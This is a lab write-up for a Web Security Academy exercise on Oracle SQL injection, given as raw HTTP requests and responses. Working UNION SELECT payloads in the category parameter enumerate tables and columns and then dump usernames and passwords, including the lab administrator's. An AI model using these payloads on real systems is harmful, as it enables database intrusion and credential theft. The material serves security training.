# SQL injection attack, listing the database contents on Oracle

### First I checked two columns are there by retrieving from `dual`, then retrieved table names by the below request .
**Request**
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2
Host: 0a11009104bab7098043085e009f00d3.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a11009104bab7098043085e009f00d3.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 18062

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on Oracle</title>
    </head>
    [...middle remain omitted...]
              <tr>
                  <th>USERS_AEFLRG</th>
              </tr>
              <tr>
                  <th>XDB$XIDX_IMP_T</th>
              </tr>
            </tbody>
        </table>
    </div>
  </section>
  <div class="footer-wrapper">
  </div>
</div>
</body>
</html>
```
### Got the table name starting with `USERS_*` .

---

### From the retrieved table name trying to find the column names .
**Request**
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_AEFLRG'-- HTTP/2
Host: 0a11009104bab7098043085e009f00d3.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a11009104bab7098043085e009f00d3.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9850

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on Oracle</title>
    </head>
    [...middle remain omitted...]
                <tr>
                    <th>PASSWORD_TTFZMX</th>
                </tr>
                [...middle remain omitted...]
                <tr>
                    <th>USERNAME_VAIOQC</th>
                </tr>
              </tbody>
            </table>
        </div>
    </section>
    <div class="footer-wrapper">
    </div>
</div>
</body>
</html>
```
### Got the column name I need .

---

**Request**
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+USERNAME_VAIOQC,+PASSWORD_TTFZMX+FROM+USERS_AEFLRG-- HTTP/2
Host: 0a11009104bab7098043085e009f00d3.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a11009104bab7098043085e009f00d3.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9985

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on Oracle</title>
    </head>
    [...middle remain omitted...]
                    <tr>
                        <th>administrator</th>
                        <td>icm0yen7c0bx9j1qghbd</td>
                    </tr>
                    <tr>
                        <th>carlos</th>
                        <td>rz9uxhb52xf0eaw5hp6b</td>
                    </tr>
                    <tr>
                        <th>wiener</th>
                        <td>hji8sodw1had9axncff8</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </section>
    <div class="footer-wrapper">
    </div>
</div>
</body>
</html>
```
### Got the admin user and password . Now I can login








